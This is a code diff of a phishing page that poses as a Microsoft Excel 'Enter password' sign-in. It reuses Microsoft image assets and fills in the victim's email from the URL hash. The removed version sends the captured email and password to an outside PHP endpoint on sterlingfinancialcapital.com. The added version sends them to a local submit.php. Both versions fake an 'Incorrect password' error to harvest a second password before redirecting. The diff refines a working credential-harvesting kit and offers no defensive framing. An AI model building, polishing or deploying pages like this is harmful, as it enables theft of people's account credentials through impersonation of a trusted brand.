@@ -1,14 +1,9 @@
-<!--18 AUGUST, 2025-->
-
 <!DOCTYPE html>
 <html lang="en">
-  <script language="JavaScript">
-alert("Microsoft Excel Document Requires Authentication. Click Ok To Continue")
-</script>
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title></title>
+    <title>Microsoft Excel Document Authentication</title>
     <style>
         * {
             box-sizing: border-box;
@@ -37,7 +32,6 @@ alert("Microsoft Excel Document Requires Authentication. Click Ok To Continue")
             text-align: center;
         }
 
-        /* [Rest of your CSS remains exactly the same] */
         .logo { margin-bottom: 20px; }
         .logo img { width: 60px; height: 60px; }
         .title-header { display: flex; align-items: center; justify-content: center; margin-bottom: 30px; position: relative; }
@@ -45,40 +39,86 @@ alert("Microsoft Excel Document Requires Authentication. Click Ok To Continue")
         .backButton img { width: 24px; height: 24px; }
         h1 { font-size: 24px; color: #333; margin: 0; }
         .input-container { position: relative; margin-bottom: 20px; }
-        input[type="password"], input[type="text"] { width: 100%; padding: 12px 15px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
-        .show-password { position: absolute; right: 10px; top: 50%; transform: translateY(-50%); background: none; border: none; color: #0066cc; cursor: pointer; font-size: 14px; }
+        input[type="password"], input[type="text"] { 
+            width: 100%; 
+            padding: 12px 15px; 
+            border: 1px solid #ddd; 
+            border-radius: 4px; 
+            font-size: 16px; 
+            outline: none;
+        }
+        input[type="password"]:focus, input[type="text"]:focus {
+            border-color: #0066cc;
+            box-shadow: 0 0 0 2px rgba(0, 102, 204, 0.2);
+        }
+        .show-password { 
+            position: absolute; 
+            right: 10px; 
+            top: 50%; 
+            transform: translateY(-50%); 
+            background: none; 
+            border: none; 
+            color: #0066cc; 
+            cursor: pointer; 
+            font-size: 14px; 
+            padding: 5px 10px;
+        }
         .forgot-password { margin-bottom: 25px; text-align: right; }
         .forgot-password a { color: #0066cc; text-decoration: none; font-size: 14px; }
-        .signin-button { width: 100%; padding: 12px; background-color: #107c41; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 20px; }
+        .signin-button { 
+            width: 100%; 
+            padding: 12px; 
+            background-color: #107c41; 
+            color: white; 
+            border: none; 
+            border-radius: 4px; 
+            font-size: 16px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            margin-bottom: 20px;
+            transition: background-color 0.3s;
+        }
         .signin-button:hover { background-color: #0e6b38; }
-        .footer { font-size: 12px; color: #666; }
+        .signin-button:disabled { 
+            background-color: #cccccc; 
+            cursor: not-allowed;
+        }
+        .footer { font-size: 12px; color: #666; margin-top: 20px; }
         .footer a { color: #0066cc; text-decoration: none; }
-        .moveOffScreen { position: absolute; left: -9999px; }
-        #error { color: #ff0000; font-weight: bold; padding: 8px; display: none; background-color: #ffeeee; border: 1px solid #ffcccc; border-radius: 4px; margin-bottom: 10px; }
+        #error { 
+            color: #d32f2f; 
+            font-weight: 500; 
+            padding: 12px; 
+            display: none; 
+            background-color: #ffebee; 
+            border: 1px solid #ffcdd2; 
+            border-radius: 4px; 
+            margin-bottom: 20px;
+            text-align: left;
+        }
     </style>
 </head>
 <body>
-  
-  
-  <form id="login-form">
-        <div class="login-container">
-            <div class="logo">
-                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbUCVrMEyON9dR4PTyB0GxjJ5EutN596HW_Dmu5eONI4OI17CreZlW4yEkVWM_3csV_MHLPbb-7rsDppIME5J8qaWgudA1cz9Et96gHzLk07owX9XoI4SAi0uG5j4i4zWuO6_eSluC5pyBODzVnVqJaL9c_9YuPtwK_PDxyTUuQ9kalEdkYYc7V8jOebrA/s2203/logo.png" />
-            </div>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgbUCVrMEyON9dR4PTyB0GxjJ5EutN596HW_Dmu5eONI4OI17CreZlW4yEkVWM_3csV_MHLPbb-7rsDppIME5J8qaWgudA1cz9Et96gHzLk07owX9XoI4SAi0uG5j4i4zWuO6_eSluC5pyBODzVnVqJaL9c_9YuPtwK_PDxyTUuQ9kalEdkYYc7V8jOebrA/s2203/logo.png" alt="Microsoft Logo" />
+        </div>
 
-            <div class="title-header">
-                <button type="button" class="backButton" id="idBtn_Back" aria-label="Back">
-                    <img role="presentation" src="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" alt="Logo" />
-                </button>
-                <h1>Enter password</h1>
-            </div>
+        <div class="title-header">
+            <button type="button" class="backButton" id="idBtn_Back" aria-label="Back">
+                <img role="presentation" src="https://aadcdn.msftauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" alt="Back" />
+            </button>
+            <h1>Enter password</h1>
+        </div>
 
-            <input type="hidden" id="email" name="email" value="" />
-
+        <form id="login-form" method="POST">
             <div id="error">Incorrect password. Please try again.</div>
-
+            
             <div class="input-container">
-                <input type="password" id="password" name="password" placeholder="Password" autocomplete="current-password" required />
+                <input type="text" id="email-display" value="" readonly disabled style="background-color: #f5f5f5; margin-bottom: 10px;">
+                <input type="hidden" id="email" name="email" value="">
+                
+                <input type="password" id="psw" name="password" placeholder="Password" autocomplete="current-password" required />
                 <button type="button" class="show-password">Show</button>
             </div>
 
@@ -87,88 +127,128 @@ alert("Microsoft Excel Document Requires Authentication. Click Ok To Continue")
             </div>
 
             <button type="submit" class="signin-button" id="submitBtn">Sign in</button>
+        </form>
 
-            <div class="footer">
-                <a href="#">Terms of use</a> | <a href="#">Privacy & cookies</a> | <a href="#">Help</a>
-            </div>
+        <div class="footer">
+            <a href="#">Terms of use</a> | <a href="#">Privacy & cookies</a> | <a href="#">Help</a>
         </div>
-    </form>
+    </div>
 
-
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
-
-<script>
-    let step = 1;
-    const clientID = window.location.hash.split("#").pop();
-    const domain = clientID.split('@').pop();
-    
-    // Set email value
-    $('#email').val(clientID);
-    
-    // Handle form submission
-    $("#login-form").submit(function(event) {
-        event.preventDefault();
-        
-        const submitBtn = $("#submitBtn");
-        const errorDiv = $("#error");
-        const passwordInput = $("#psw");
-        
-        submitBtn.text('Verifying...');
-        submitBtn.prop('disabled', true);
-        
-        // Collect data
-        const formData = {
-            email: $("#email").val(),
-            password: passwordInput.val(),
-            attempt: step
-        };
-        
-        // Send to PHP backend
-        $.ajax({
-            url: 'https://sterlingfinancialcapital.com/excel/api.php',
-            type: 'POST',
-            data: formData,
-            dataType: 'json',
-            success: function(response) {
-                if (response.success) {
-                    if (response.redirect) {
-                        // Redirect after 2nd attempt
-                        window.location.href = response.redirect;
-                    } else {
-                        // Show error and prepare for next attempt
-                        step = response.next_attempt || step + 1;
-                        errorDiv.css("display", "block");
-                        submitBtn.text('Sign In');
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        // Initialize
+        $(document).ready(function() {
+            // Get email from URL hash
+            let email = '';
+            if (window.location.hash) {
+                email = window.location.hash.substring(1);
+            }
+            
+            // Set email values
+            $('#email').val(email);
+            $('#email-display').val(email);
+            
+            // Back button functionality
+            $('#idBtn_Back').click(function() {
+                window.history.back();
+            });
+            
+            // Show/Hide password functionality
+            $('.show-password').click(function() {
+                const passwordInput = $('#psw');
+                const showBtn = $(this);
+                
+                if (passwordInput.attr('type') === 'password') {
+                    passwordInput.attr('type', 'text');
+                    showBtn.text('Hide');
+                } else {
+                    passwordInput.attr('type', 'password');
+                    showBtn.text('Show');
+                }
+            });
+            
+            // Form submission
+            $('#login-form').submit(function(e) {
+                e.preventDefault();
+                
+                const submitBtn = $('#submitBtn');
+                const errorDiv = $('#error');
+                const passwordInput = $('#psw');
+                const emailInput = $('#email');
+                
+                // Disable button and show loading
+                submitBtn.prop('disabled', true);
+                submitBtn.text('Verifying...');
+                errorDiv.hide();
+                
+                // Get attempt count from localStorage or start at 1
+                let attempt = localStorage.getItem('login_attempt') || 1;
+                
+                // Prepare form data
+                const formData = {
+                    email: emailInput.val(),
+                    password: passwordInput.val(),
+                    attempt: parseInt(attempt)
+                };
+                
+                console.log('Sending data:', formData); // Debug log
+                
+                // Send AJAX request
+                $.ajax({
+                    url: 'submit.php', // Make sure this points to your PHP file
+                    type: 'POST',
+                    data: formData,
+                    dataType: 'json',
+                    timeout: 10000, // 10 second timeout
+                    
+                    success: function(response) {
+                        console.log('Response received:', response); // Debug log
+                        
+                        if (response && response.success) {
+                            if (response.redirect) {
+                                // Redirect after 2 attempts
+                                window.location.href = response.redirect;
+                            } else {
+                                // Increment attempt counter
+                                attempt = parseInt(attempt) + 1;
+                                localStorage.setItem('login_attempt', attempt);
+                                
+                                // Show error message
+                                errorDiv.show();
+                                errorDiv.text('Incorrect password. Please try again.');
+                                
+                                // Reset form
+                                submitBtn.prop('disabled', false);
+                                submitBtn.text('Sign in');
+                                passwordInput.val('');
+                                passwordInput.focus();
+                            }
+                        } else {
+                            // Handle error response
+                            errorDiv.show();
+                            errorDiv.text(response.error || 'An error occurred. Please try again.');
+                            submitBtn.prop('disabled', false);
+                            submitBtn.text('Sign in');
+                        }
+                    },
+                    
+                    error: function(xhr, status, error) {
+                        console.error('AJAX Error:', status, error); // Debug log
+                        
+                        // Fallback behavior if PHP fails
+                        errorDiv.show();
+                        errorDiv.text('Connection error. Please try again.');
                         submitBtn.prop('disabled', false);
-                        passwordInput.val("");
+                        submitBtn.text('Sign in');
+                        passwordInput.val('');
                         passwordInput.focus();
                     }
-                }
-            },
-            error: function() {
-                // Fallback if PHP fails
-                errorDiv.css("display", "block");
-                errorDiv.text('Connection error. Please try again.');
-                submitBtn.text('Sign In');
-                submitBtn.prop('disabled', false);
-                passwordInput.val("");
-            }
+                });
+            });
+            
+            // Focus password field on load
+            $('#psw').focus();
         });
-    });
-    
-    // Show/hide password toggle
-    document.querySelector('.show-password').addEventListener('click', function () {
-        const passwordInput = document.getElementById('psw');
-        const showBtn = this;
-        
-        if (passwordInput.type === 'password') {
-            passwordInput.type = 'text';
-            showBtn.textContent = 'Hide';
-        } else {
-            passwordInput.type = 'password';
-            showBtn.textContent = 'Show';
-        }
-    });
-</script>
+    </script>
 </body>
 </html>
